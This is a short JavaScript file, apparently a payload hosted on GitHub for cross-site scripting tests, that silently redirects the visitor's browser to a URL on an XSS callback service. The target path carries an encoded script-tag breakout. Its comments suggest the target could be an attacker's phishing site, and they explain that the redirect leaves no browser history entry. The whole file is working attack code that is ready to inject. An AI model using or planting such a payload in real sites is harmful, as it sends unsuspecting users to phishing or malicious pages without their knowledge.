// Redirect.js hosted on GitHub
(function() {
    // 1. Define the target URL (e.g., an attacker's phishing site, or a harmless test site like example.com)
    var targetURL = "https://xss.report/c/durgesh%3E%3C/script%3E"; 

    // 2. Perform the immediate URL redirection
    // window.location.replace() is often used as it removes the original page from the browser history.
    window.location.replace(targetURL); 

    // Optional: Log a message to the console before the redirection occurs
    console.log("Attempting redirection to:", targetURL);

})();

